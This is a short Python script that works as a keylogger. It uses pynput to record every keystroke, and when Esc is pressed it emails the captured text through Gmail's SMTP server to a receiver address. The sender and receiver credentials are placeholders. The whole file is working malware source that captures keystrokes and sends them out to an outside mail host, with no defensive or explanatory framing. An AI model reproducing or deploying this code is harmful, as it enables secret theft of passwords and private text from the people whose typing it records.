import pynput
import smtplib, ssl
from pynput.keyboard import Key, Listener

receiver_email = "receiver_email@mail.com"

""" Mail to send the keyfile """
host_mail = "sending_email@gmail.com"
host_pass = "sending_email_password"

""" Secure Socket Layer (SSL) Opts """
PORT = 465 # SSL port
SMTP_SERVER = "smtp.gmail.com" # smtp server address
# Create a secure SSL context
CONTEXT = ssl.create_default_context()


keys = []
word_count = len(keys)

def key_presses(key):
    global keys, word_count
    keys.append(key)


def send_mail(keys):
    message = ""
    for key in keys:
        _key = str(key).replace("'","")
        if _key.find("space") > 0:
            message += "\n"
        elif _key.find("key") == -1:
            message += _key
    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=CONTEXT) as server:
            server.login(host_mail, host_pass)
            server.sendmail(host_mail, receiver_email, message)
            print("\nEmail successfully sent!")
    except:
        print("\nError occurred while trying to send the email.. Please try again.")


def release(key):
    if key == Key.esc:
        send_mail(keys)
        return False


if __name__ == "__main__":
    with Listener(on_press=key_presses, on_release=release) as listener:
        listener.join()


